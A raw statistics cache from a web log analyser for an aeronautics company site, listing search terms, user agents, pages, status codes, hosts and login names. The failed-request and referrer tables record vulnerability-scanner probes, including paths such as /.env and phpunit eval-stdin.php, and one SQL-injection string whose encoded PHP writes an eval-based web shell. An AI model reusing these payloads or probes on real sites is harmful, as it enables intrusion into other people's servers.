N	RQ	9	3992742243	outlet louis vuitton handbags
N	RQ	1	3992742243	cowling drawing
N	RQ	1	3992742243	mitsubishi zero
N	RQ	1	3992742243	powell wy gt aeronautics
N	RQ	2	3992742243	what is gt in basic engineering drawing
N	RQ	2	3992742243	composite molding
N	RQ	1	3992742243	aeronautics in simi valley and security work
N	RQ	3	3992742243	gt aeronautics llc jobs
N	RQ	1	3992742243	crew flight gta
N	RQ	1	3992742243	110cc engine timing
N	RQ	1	3992742243	aeronautical engineer quotes
N	RQ	2	3992742243	http://www.gtaeronautics.com/compnews.html
N	RQ	4	3992742243	wyoming flight engineers
N	RQ	1	3992742243	a t 6
N	RQ	1	3992742243	gt aeronautics unmanned air
N	RQ	1	3992742243	fia gt composite tooling
N	RQ	1	3992742243	uas pilot certification
N	RQ	1	3992742243	quotes on aeronautical engineers
N	RQ	1	3992742243	payload for diamond northrop twin engie aircraft
N	RQ	7	3992742243	content
N	RQ	1	3992742243	bme 110
N	RQ	1	3992742243	thomas w rullman gt aeronautics
N	RQ	1	3992742243	luggages for sale
N	RQ	2	3992742243	easylifeapp profile
N	RQ	2	3992742243	simi gt
N	RQ	1	3992742243	mq1 design fuel
N	RQ	1	3992742243	airplane as always cia america2009
N	RQ	1	3992742243	eengineer drawing home
N	RQ	1	3992742243	heavy equipment operator jobs
N	RQ	1	3992742243	aero space drone simi valley
N	RQ	1	3992742243	cheap louis vuitton luggage
N	RQ	1	3992742243	2 stroke electric onboard starter
N	RQ	1	3992742243	skyforce observer mk3
N	RQ	1	3992742243	simi valley unmanned aircraft
N	RQ	2	3992742243	granger whitelaw avia
N	RQ	1	3992742243	louis vuitton fashion valley neverfull
N	RQ	1	3992742243	louis vuitton job opportunities
N	RQ	1	3992742243	google.com
N	RQ	1	3992742243	uas operation training method
N	RQ	2	3992742243	wmaid.com explore gtaeronautics.com
N	RQ	1	3992742243	custum muffler 110cc
N	RQ	1	3992742243	glass manufacturing drawings
N	RQ	1	3992742243	electric motors x male uav x sale
N	RQ	1	3992742243	aerospacecompanies in simi valley
N	RQ	1	3992742243	fiberglass molding
N	RQ	2	3992742243	aeronautical technology inc
N	RQ	1	3992742243	taranis ucav
N	RQ	1	3992742243	vegas drone uav show december 2015
N	RQ	1	3992742243	uav companies in simi valley
N	RQ	1	3992742243	unmanned aircraft systems pilot training
N	RQ	2	3992742243	installerex facebook
N	RQ	3	3992742243	texan at6 photos
N	RQ	1	3992742243	aeronautic engineer
N	RQ	30	3992742243	designer handbags outlet sale
N	RQ	1	3992742243	rpas qulificationa traing with faa
N	RQ	1	3992742243	faa uav training
N	RQ	1	3992742243	uav companies simi valley
N	RQ	5	3992742243	louis vuitton purses outlet
N	RQ	1	3992742243	aeronautics
N	RQ	1	3992742243	cheap louis vuitton luggage outlet
N	RQ	1	3992742243	gt aeronautics tomas rullman
N	RQ	1	3992742243	tobbot
N	RQ	1	3992742243	radius tdw efi fuze
N	RQ	8	3992742243	manufacturing equipment store in simi valley
N	RQ	1	3992742243	aeronautic engineer quotes
N	RQ	1	3992742243	onbordstarter
N	RQ	1	3992742243	rotax amphibian unmanned china
N	RQ	1	3992742243	aeronautical engineering quotes
N	RQ	1	3992742243	drawing aircraft engineering
N	RQ	1	3992742243	gt aeronautics careers
N	RQ	1	3992742243	gt aeronautics bandito
N	RQ	1	3992742243	cody wy carbon fiber
N	RQ	2	3690517190	fiberglass molding techniques
N	RQ	6	3690517190	manufacturing aeronautical prototypes
N	RQ	19	3690517190	louis vuitton luggage outlet
N	RQ	10	3690517190	louis vuitton fashion valley phone
N	RQ	97	3690517190	louis vuitton fashion valley phone number
N	RQ	2	3690517190	texan at 6
N	RQ	18	3690517190	louis vuitton fashion valley ca
N	RQ	3	3388292137	bandito uav
N	RQ	3	3388292137	onboard starter
N	RQ	6	3086067084	texan at6
N	RQ	5	3086067084	bandito pglm
N	RQ	20	2783842031	www.gtaeronautics.com
N	RQ	7	2481616978	bme extreme
N	RQ	7	2481616978	aerospace engineering drawings
N	RQ	25	1940983426	http://www.gtaeronautics.com/
N	RQ	8	1877166872	at6 texan
N	RQ	9	1574941819	at 6 texan
N	RQ	14	668266660	aeronautical engineering drawing
N	RQ	20	63816554	gt aeronautics
B	*f	-40R	r
B	Rb	35244	4.929	Mozilla/5.0 (compatible; bingbot/2.0;  http://www.bing.com/bingbot.htm)
B	Rb	31244	1.943	ZoominfoBot (zoominfobot at zoominfo dot com)
B	Rb	25930	1.841	Mozilla/5.0 (compatible; Googlebot/2.1;  http://www.google.com/bot.html)
B	Rb	15774	1.485	Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1)
B	Rb	12579	2.149	Mozilla/5.0 (iPhone; CPU iPhone OS 7_0 like Mac OS X) AppleWebKit/537.51.1 (KHTML, like Gecko) Version/7.0 Mobile/11A465 Safari/9537.53 (compatible; bingbot/2.0;  http://www.bing.com/bingbot.htm)
B	Rb	9940	1.080	Mozilla/5.0 (compatible; YandexBot/3.0;  http://yandex.com/bots)
B	Rb	9918	1.070	Mozilla/5.0 (compatible; Baiduspider/2.0;  http://www.baidu.com/search/spider.html)
B	Rb	9735	0.886	Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko
B	Rb	9507	0.690	Sogou web spider/4.0( http://www.sogou.com/docs/help/webmasters.htm#07)
B	Rb	8061	1.426	Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; .NET CLR 1.1.4322; .NET CLR 2.0.50727)
B	Rb	7416	0.650	Mozilla/5.0 (compatible; Yahoo! Slurp; http://help.yahoo.com/help/us/ysearch/slurp)
B	Rb	7100	0.339	Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; .NET CLR 2.0.50727)
B	Rb	6942	0.296	Mozilla/4.0 (compatible;)
B	Rb	6427	0.492	Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1)
B	Rb	6164	0.071	Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; .NET CLR 1.1.4322; .NET CLR 2.0.50727; .NET CLR 3.0.4506.2152; .NET CLR 3.5.30729)
B	Rb	6152	0.555	Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.1; WOW64; Trident/5.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0; .NET4.0C; .NET4.0E)
B	Rb	6060	0.353	Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/36.0.1985.143 Safari/537.36
B	Rb	5848	0.419	Sosospider ( http://help.soso.com/webspider.htm)
B	Rb	5767	0.182	Googlebot-Image/1.0
B	Rb	5436	0.477	Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.7.2) Gecko/20040804 Netscape/7.2 (ax)
B	Rb	5308	0.204	Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; .NET CLR 1.1.4322; .NET CLR 2.0.50727; .NET CLR 3.0.04506.30)
B	Rb	5198	0.504	Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1)
B	Rb	4871	0.190	Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; WOW64; Trident/5.0)
B	Rb	4761	1.502	Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/33.0.1736.0 Safari/537.36
B	Rb	4446	0.279	Mozilla/5.0 (compatible; Yahoo! Slurp/3.0; http://help.yahoo.com/help/us/ysearch/slurp)
B	Rb	4368	0.055	Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; .NET CLR 2.0.50727; .NET CLR 3.0.4506.2152; .NET CLR 3.5.30729)
B	Rb	4179	0.676	Mozilla/5.0 (iPhone; CPU iPhone OS 7_0 like Mac OS X) AppleWebKit/537.51.1 (KHTML, like Gecko) Version/7.0 Mobile/11A465 Safari/9537.53 BingPreview/1.0b
B	Rb	4114	0.586	Mozilla/5.0 (Linux; Android 6.0.1; Nexus 5X Build/MMB29P) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2272.96 Mobile Safari/537.36 (compatible; Googlebot/2.1;  http://www.google.com/bot.html)
B	Rb	4025	0.301	Mozilla/5.0 (compatible; AhrefsBot/7.0;  http://ahrefs.com/robot/)
B	Rb	3762	0.234	Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; .NET CLR 1.1.4322)
B	Rb	3595	0.439	Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; InfoPath.2; .NET CLR 2.0.50727; .NET CLR)
B	Rb	3493	0.283	Mozilla/5.0 (compatible; MJ12bot/v1.4.5; http://www.majestic12.co.uk/bot.php? )
B	Rb	3481	0.194	Mozilla/5.0 (X11; Datanyze; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36
B	Rb	3346	0.579	PRurl
B	Rb	3307	0.119	Mozilla/5.0 (compatible; SeznamBot/3.2;  http://napoveda.seznam.cz/en/seznambot-intro/)
B	Rb	3206	0.853	Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; .NET CLR 2.0.50727; .NET CLR 1.1.4322)
B	Rb	3062	0.124	Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; .NET CLR 1.1.4322)
B	Rb	3049	0.064	Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0; .NET CLR 2.0.50727; .NET CLR 3.0.4506.2152; .NET CLR 3.5.30729; .NET4.0C; .NET CLR 1.1.4322)
B	Rb	2892	0.339	Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/5.0)
B	Rb	2881	0.256	Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; .NET CLR 1.1.4322; .NET CLR 2.0.50727)
B	Rb	645760	70.885	[not listed: 19342]
b	*f	-15Q	s
b	lRQq	1	31244	3992742794	474.305	ZoominfoBot (zoominfobot at zoominfo dot com)
b	lRQq	1	3346	3992742248	474.305	PRurl
b	lRQq	1	41	3992742247	474.305	Expanse, a Palo Alto Networks company, searches across the global IPv4 space multiple times per day to identify customers&#39; presences on the Internet. If you would like to be excluded from our scans, please send IP addresses
b	lRQq	2	41	3992742247	474.305	Expanse, a Palo Alto Networks company, searches across the global IPv4 space multiple times per day to identify customers&#39; presences on the Internet. If you would like to be excluded from our scans, please send IP addresses/domains
b	lRQq	1	8	3992742244	474.305	Slackbot-LinkExpanding 1.0 ( https:
b	lRQq	2	8	3992742244	474.305	Slackbot-LinkExpanding 1.0 ( https://api
b	lRQq	1	855	3992742244	474.305	The Knowledge AI
b	lRQq	1	20	4056558797	481.885	com.google.GoogleMobile
b	lRQq	2	1	3992742243	474.305	com.google.GoogleMobile/72
b	lRQq	2	1	3992742243	474.305	com.google.GoogleMobile/65
b	lRQq	2	3	3992742243	474.305	com.google.GoogleMobile/38
b	lRQq	2	3	3992742243	474.305	com.google.GoogleMobile/60
b	lRQq	2	1	3992742243	474.305	com.google.GoogleMobile/61
b	lRQq	2	2	3992742243	474.305	com.google.GoogleMobile/34
b	lRQq	2	2	3690517190	438.403	com.google.GoogleMobile/62
b	lRQq	2	2	3690517190	438.403	com.google.GoogleMobile/67
b	lRQq	2	2	3690517190	438.403	com.google.GoogleMobile/41
b	lRQq	2	3	3388292137	402.501	com.google.GoogleMobile/42
b	lRQq	1	32	4056558797	481.885	WordPress
b	lRQq	2	13	3086067084	366.599	WordPress/3
b	lRQq	2	19	970491713	115.286	WordPress/4
b	lRQq	1	6	3992742243	474.305	
b	lRQq	2	6	3992742243	474.305	/n
b	lRQq	1	1	3992742243	474.305	Go http package
b	lRQq	1	45	3992742243	474.305	Nokia6280
b	lRQq	2	45	3992742243	474.305	Nokia6280/2
b	lRQq	1	3	3992742243	474.305	8LEGS
b	lRQq	1	17	3992742243	474.305	NokiaN70-1
b	lRQq	2	17	3992742243	474.305	NokiaN70-1/5
b	lRQq	1	1	3992742243	474.305	MyApp
b	lRQq	1	530	3992742243	474.305	WikiDo
b	lRQq	2	530	3992742243	474.305	WikiDo/1
b	lRQq	1	1	3992742243	474.305	Links (2.1pre15; Linux 2.4.26 i686; 158x61)
b	lRQq	1	918198	952584670	113.159	[not listed: 792]
p	*f	0Q	s
p	lR	1	224271	OS unknown
p	lR	1	74151	Known robots
p	lR	1	522584	Windows
p	lR	2	220629	Unknown Windows
p	lR	2	47225	Windows NT
p	lR	2	238723	Windows XP
p	lR	2	9311	Windows 2000
p	lR	2	381	Windows 3.1
p	lR	2	2190	Windows 95
p	lR	2	392	Windows CE
p	lR	2	2326	Windows 98
p	lR	2	1407	Windows ME
p	lR	1	53217	Unix
p	lR	2	52417	Linux
p	lR	2	729	Other Unix
p	lR	2	22	SunOS
p	lR	2	46	BSD
p	lR	2	3	HP-UX
p	lR	1	80093	Macintosh
p	lR	2	76005	Unknown Macintosh
p	lR	2	3113	Macintosh PowerPC
p	lR	2	975	Macintosh 68k
p	lR	1	16	WebTV
p	lR	1	1	BeOS
p	lR	1	8	OS/2
p	lR	1	7	Amiga
i	*f	0R	s
i	lRc	1	558091	43.669	[root directory]
i	lRc	1	254621	55.945	/images/
i	lRc	1	97782	0.207	/js/
i	lRc	1	51290	0.180	/css/
i	lRc	1	865	0.000	/videos/
i	lRc	1	541	0.000	/client/
i	lRc	1	1	0.000	/cgi-bin/
i	lRc	1	174	0.000	/dev/
i	lRc	2	23	0.000	/dev/css/
i	lRc	2	44	0.000	/dev/js/
i	lRc	2	59	0.000	/dev/images/
i	lRc	1	1	0.000	/secure/
i	lRc	1	74	0.000	/stats/
r	*f	0.050000%S	s
r	lRSc	1	17500	71	1.764	/contactus.html
r	lRSc	1	26180	68	2.653	/aboutus.html
r	lRSc	1	17092	64	4.004	/consultinga.html
r	lRSc	1	14805	62	1.890	/employment.html
r	lRSc	1	16418	61	3.185	/cct&m.html
r	lRSc	1	8087	60	2.528	/sru.html
r	lRSc	1	13020	59	1.499	/pna.html
r	lRSc	1	16551	59	2.305	/cfmt.html
r	lRSc	1	22507	59	27.561	/compnews.html
r	lRSc	1	4578	58	2.420	/gt50t+rpas.html
r	lRSc	1	21187	58	3.443	/uasfc.html
r	lRSc	1	4934	54	2.309	/gt1500+rpas.html
r	lRSc	1	4835	52	2.207	/gt380+rpas.html
r	lRSc	1	508	38	1.457	/gt100hl+rpas.html
r	lRSc	1	14222	20	0.950	/links.html
r	lRSc	1	12415	18	0.882	/faq.html
r	lRSc	1	13573	17	0.633	/indevents.html
r	lRSc	1	26705	16	37.667	/indnews.html
r	lRSc	2	126	0	0.000	/indnews.html?referer=www.clickfind.com.au/wp-login.php
r	lRSc	2	1	0	0.000	/indnews.html?referer=top1.co.pl
r	lRSc	2	1	0	0.000	/indnews.html?referer=www.clickfind.com.au//wp-content/themes/busybee/thumb.php?src=http://blogger.com.opontodaarte.com.br/java.php
r	lRSc	1	9522	7	0.313	/rd.html
r	lRSc	1	4036	3	0.121	/uavengines.html
r	lRSc	1	3770	2	0.086	/banditomav.html
r	lRSc	1	3873	2	0.078	/gtatexan.html
r	lRSc	1	3686	1	0.044	/bandituas.html
r	lRSc	1	1	0	0.000	/client/bandito timeline2007.html
r	lRSc	1	2	0	0.000	/client/bandit+timeline2004.html
r	lRSc	1	1	0	0.000	/stats/quick.html
r	lRSc	1	1	0	0.000	/404.htm
r	lRSc	1	12	0	0.000	/client/gta010707002.html
r	lRSc	1	72	0	0.000	/client/bandito+development.html
r	lRSc	1	135	0	0.000	/client/welcome.html
r	lRSc	1	3	0	0.000	/client/gta021305001.html
r	lRSc	1	1	0	0.000	/stats/browserrep.html
r	lRSc	1	741	0	0.000	/gt50t rpas.html
r	lRSc	1	5	0	0.000	/client/gta012405001.html
r	lRSc	1	2	0	0.000	/dev/contactus.html
r	lRSc	1	4	0	0.000	/stats/general.html
r	lRSc	1	1	0	0.000	/stats/dailyrep.html
r	lRSc	1	1	0	0.000	/dev/aboutus.html
r	lRSc	1	18	0	0.000	/client/tacamo+development.html
r	lRSc	1	1	0	0.000	/client/bandit development.html
r	lRSc	1	17	0	0.000	/client/bandit+timeline2008.html
r	lRSc	1	1	0	0.000	/client/bandito+timeline2005.html
r	lRSc	1	23	0	0.000	/client/projectbids.html
r	lRSc	1	1	0	0.000	/stats/host.html
r	lRSc	1	11	0	0.000	/client/rq2+outlaw.html
r	lRSc	1	1	0	0.000	/client/bandit timeline2008.html
r	lRSc	1	20	0	0.000	/client/clientpna.html
r	lRSc	1	15	0	0.000	/client/bandit.html
r	lRSc	1	2	0	0.000	/stats/default.asp
r	lRSc	1	21	0	0.000	/index.htm
r	lRSc	1	1	0	0.000	/cgi-bin/testms.pl
r	lRSc	1	975	0	0.000	/gtamt.html
r	lRSc	1	14	0	0.000	/client/rq1+bandit.html
r	lRSc	1	2253	0	0.000	/gt1500 rpas.html
r	lRSc	1	6	0	0.000	/client/gta021305002.html
r	lRSc	1	4	0	0.000	/client/gta121004001.html
r	lRSc	1	24	0	0.000	/client/tacamo.html
r	lRSc	1	30	0	0.000	/client/mgqgcyat.asp
r	lRSc	1	1	0	0.000	/dev/client.cgi
r	lRSc	1	18702	0	0.000	/default.asp
r	lRSc	1	1666	0	0.000	/gt380 rpas.html
r	lRSc	1	1	0	0.000	/client/bandito+timeline2006.html
r	lRSc	1	16	0	0.000	/client/rq3+bandito.html
r	lRSc	1	1	0	0.000	/dev/uasfc.html
r	lRSc	1	229	0	0.000	/client.cgi
r	lRSc	1	71	0	0.000	/client/bandit+development.html
r	lRSc	1	2	0	0.000	/client/bandito development.html
r	lRSc	1	2	0	0.000	/stats/yearly.html
r	lRSc	1	2	0	0.000	/stats/domain.html
r	lRSc	1	1	0	0.000	/stats/monthly.html
r	lRSc	1	2	0	0.000	/stats/weekly.html
r	lRSc	1	8	0	0.000	/client/gta010707001.html
r	lRSc	1	3749	0	0.000	/bidspridpass.html
r	lRSc	1	6356	0	0.000	/pridpass.html
r	lRSc	1	12	0	0.000	/client/bandito.html
r	lRSc	1	1	0	0.000	/dev/pna.html
r	lRSc	1	1	0	0.000	/client/tacamo development.html
r	lRSc	1	4	0	0.000	/stats/index.htm
r	lRSc	1	4	0	0.000	/stats/nav.html
r	lRSc	1	1	0	0.000	/stats/quarterly.html
r	lRSc	1	2	0	0.000	/stats/directory.html
r	lRSc	1	2	0	0.000	/stats/organisation.html
r	lRSc	1	8	0	0.000	/client/bandito+timeline2007.html
r	lRSc	1	7	0	0.000	/client/bandit+timeline2007.html
r	lRSc	1	1	0	0.000	/dev/pridpass.html
t	*f	0.100000%B	b
t	lRb	1	296285	38.690	.html [Hypertext Markup Language]
t	lRb	1	196775	29.578	.jpg  [JPEG graphics]
t	lRb	1	229445	22.216	[directories]
t	lRb	1	778	3.456	.wmv
t	lRb	1	87	3.393	.mpg  [MPEG movie]
t	lRb	1	18734	1.460	.asp  [Active Server REQUESTS]
t	lRb	1	57929	0.438	.gif  [GIF graphics]
t	lRb	1	97826	0.353	.js  [JavaScript code]
t	lRb	1	51305	0.313	.css  [Cascading Style Sheets]
t	lRb	1	14006	0.102	.ico
t	lRb	1	270	0.001	[not listed: 5]
z	*FR	2009	06	30	04	42
z	*LR	2021	07	02	23	57
z	ScR	399	0.000	73184	0
z	ScR	0	0.000	0	1b-  10b
z	ScR	0	0.000	0	11b- 100b
z	ScR	56	0.011	79107	101b-  1kb
z	ScR	1007	5.339	445775	1kb- 10kb
z	ScR	742	36.918	310963	10kb-100kb
z	ScR	182	45.390	53658	100kb-  1Mb
z	ScR	4	12.344	710	1Mb- 10Mb
z	ScR	0	0.000	43	10Mb-100Mb
c	*FR	2014	03	02	13	52
c	*LR	2021	07	02	23	57
c	*f	0R	a
c	R	882766	200 OK
c	R	6308	206 Partial content
c	R	103	301 Document moved permanently
c	R	77	302 Document found elsewhere
c	R	74366	304 Not modified since last retrieval
c	R	657	400 Bad request
c	R	207	401 Authentication required
c	R	144	403 Access forbidden
c	R	398271	404 Document not found
c	R	772	405 Method not allowed
c	R	464	406 Document not acceptable to client
c	R	67	416 Requested range not valid
c	R	612	500 Internal server error
c	R	128	501 Request type not supported
I	*FR	2007	12	11	00	52
I	*LR	2021	07	02	23	14
I	*f	-30S	s
I	lRS	1	95915	203	/robots.txt
I	lRS	1	2672	15	/ads.txt
I	lRS	1	456	11	/.env
I	lRS	1	2158	9	/index.php
I	lRS	1	1682	8	/plus/mytag_js.php
I	lRS	1	1554	7	/xmlrpc.php
I	lRS	1	869	6	/
I	lRS	1	5874	5	/wp-login.php
I	lRS	1	656	4	/videos/bandito+004+flt+8+clip+092508.wmv
I	lRS	1	339	4	/plus/download.php
I	lRS	1	760	3	/sitemap.xml
I	lRS	1	330	3	/plus/ad_js.php
I	lRS	1	97	3	/</a>
I	lRS	1	15	3	/plus/erraddsave.php
I	lRS	1	5	2	/wp-includes
I	lRS	1	88	2	/images/sbandit+powerplant+2.jpg
I	lRS	1	213	2	/videos/bandito
I	lRS	1	811	2	/">louis
I	lRS	1	63	2	/images/gt380
I	lRS	1	147	2	/vendor/phpunit/phpunit/src/util/php/eval-stdin.php
I	lRS	1	76	2	/images/gt50t
I	lRS	1	4	2	/gt100hl
I	lRS	1	70	2	/images/sru
I	lRS	1	86	2	/images/tacamo
I	lRS	1	26	2	/gt50t
I	lRS	1	131	2	/images/extreme2.jpg
I	lRS	1	481	2	/user.php
I	lRS	1	457	2	/pridpass.html
I	lRS	1	326	1	/wp1/wp-includes/wlwmanifest.xml
I	lRS	1	310	1	/shop/wp-includes/wlwmanifest.xml
I	lRS	1	284651	85	[not listed: 21525]
L	*FR	2007	12	11	00	52
L	*LR	2021	07	02	23	14
L	*f	-20S	s
L	RS	56	56	139.159.139.52
L	RS	17	17	20.55.240.114
L	RS	57	9	5.188.210.4
L	RS	22	7	66.249.70.96
L	RS	7	7	34.194.45.108
L	RS	52	6	114.119.136.128
L	RS	34	5	40.77.167.40
L	RS	24	5	40.76.244.110
L	RS	5	5	117.28.19.93
L	RS	4	4	104.196.127.152
L	RS	4	4	34.73.138.8
L	RS	58	4	114.119.140.71
L	RS	65	4	114.119.142.73
L	RS	10	4	66.249.70.126
L	RS	11	4	66.249.64.233
L	RS	8	3	66.249.64.235
L	RS	3	3	194.5.53.140
L	RS	71	3	114.119.152.56
L	RS	3	3	149.56.150.112
L	RS	3	3	149.56.150.80
L	RS	400808	243	[not listed: 73649]
K	*FR	2013	12	22	04	20
K	*LR	2021	07	02	10	50
K	*f	-30S	s
K	lRS	1	126	9	http://www.gtaeronautics.com//index.php
K	lRS	1	1193	8	http://www.gtaeronautics.com//plus/mytag_js.php
K	lRS	1	28	4	http://www.gtaeronautics.com//plus/download.php
K	lRS	1	4	3	http://www.gtaeronautics.com//plus/erraddsave.php
K	lRS	1	164	3	http://www.gtaeronautics.com//plus/ad_js.php
K	lRS	1	832	2	http://gtaeronautics.com/
K	lRS	1	14	1	http://www.gtaeronautics.com//plus/myjs.php
K	lRS	1	1	1	http://www.gtaeronautics.com//Plugin/ueditor/net/controller.ashx
K	lRS	1	14	1	http://www.gtaeronautics.com//robots.php
K	lRS	1	199	1	554fcae493e564ee0dc75bdf2ebf94caads|a:2:{s:3:"num";s:288:"*/+union+select+1,0x272f2a,3,4,5,6,7,8,0x7b24617364275D3B617373657274286261736536345F6465636F646528275A6D6C735A56397764585266593239756447567564484D6F4A325A6B5A334575634768774A79776E50443977614841675A585A686243676B583142505531526262475678645630704F79412F506963702729293B2F2F7D787878,10--+-";s:2:"id";s:3:"'/*";}
K	lRS	1	21	1	http://www.gtaeronautics.com//robots1.php
K	lRS	1	831	1	http://www.gtaeronautics.com//
K	lRS	1	15	1	http://www.gtaeronautics.com//install/index.php.bak
K	lRS	1	9	1	http://www.gtaeronautics.com//type.php
K	lRS	1	2	1	http://www.gtaeronautics.com//FCKeditor/editor/filemanager/connectors/asp/connector.asp
K	lRS	1	1	1	http://www.gtaeronautics.com//Controls/Ueditor/net/controller.ashx
K	lRS	1	16	1	http://www.gtaeronautics.com//12345.php
K	lRS	1	1	1	http://www.gtaeronautics.com//content/Ueditor/net/controller.ashx
K	lRS	1	18	1	https://www.bing.com/search
K	lRS	1	1	1	http://www.gtaeronautics.com//editor/Ueditor/net/controller.ashx
K	lRS	1	1	1	http://www.gtaeronautics.com//plus/digg_ajax.php
K	lRS	1	11	1	http://www.gtaeronautics.com//SiteServer/Ajax/ajaxOtherService.aspx
K	lRS	1	9	1	http://www.gtaeronautics.com//nuan.php
K	lRS	1	61	1	http://www.gtaeronautics.com//x.php
K	lRS	1	1	1	http://www.gtaeronautics.com//admin/Ueditor/net/controller.ashx
K	lRS	1	1	1	http://www.gtaeronautics.com//manager/Ueditor/net/controller.ashx
K	lRS	1	1	1	http://www.gtaeronautics.com//Scripts/ueditor/net/controller.ashx
K	lRS	1	11	1	http://www.gtaeronautics.com//utility/convert/index.php
K	lRS	1	1	1	http://www.gtaeronautics.com//include/dialog/select_images_post.php
K	lRS	1	1	1	http://www.gtaeronautics.com//vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
K	lRS	1	47160	7	[not listed: 4845]
E	*FR	2008	01	06	10	12
E	*LR	2021	04	13	16	15
E	*f	-30S	s
E	lSR	1	0	180	[not listed: 6]
l	*FR	2008	01	06	10	12
l	*LR	2021	04	13	16	15
l	*f	-20S	s
l	SR	0	180	[not listed: 99]
v	*f	-20B	b
v	Rb	657415	55.917	66.113.131.59
v	Rb	306025	44.083	64.41.87.40
R	*FR	2008	01	06	10	12
R	*LR	2021	04	13	16	15
R	*f	-20R	r
R	R	178	66.113.131.59
R	R	2	64.41.87.40
M	*FR	2007	12	11	00	52
M	*LR	2021	07	02	23	14
M	*f	-20R	r
M	R	302606	66.113.131.59
M	R	98716	64.41.87.40
J	*FR	2007	12	11	00	53
J	*LR	2017	03	17	18	30
J	*f	-20R	r
J	R	9	gtaeronautics
J	R	5	lorrigkj
J	R	1	rullma2063
J	R	1	administrator
J	R	1	satish
J	R	1	nnnnn
P	*FR	2021	05	11	22	50
P	*LR	2021	07	02	23	57
P	R	21	0
P	R	0	<= 0.01
P	R	520	0.01-0.02
P	R	25159	0.02-0.05
P	R	57863	0.05-0.1 
P	R	72992	0.1 -0.2 
P	R	72226	0.2 -0.5 
P	R	36488	0.5 -1   
P	R	19451	1-  2 
P	R	8381	2-  5 
P	R	4856	5- 10 
P	R	1821	10- 20 
P	R	5560	20- 60 
P	R	569	60-120 
P	R	99	120-300 
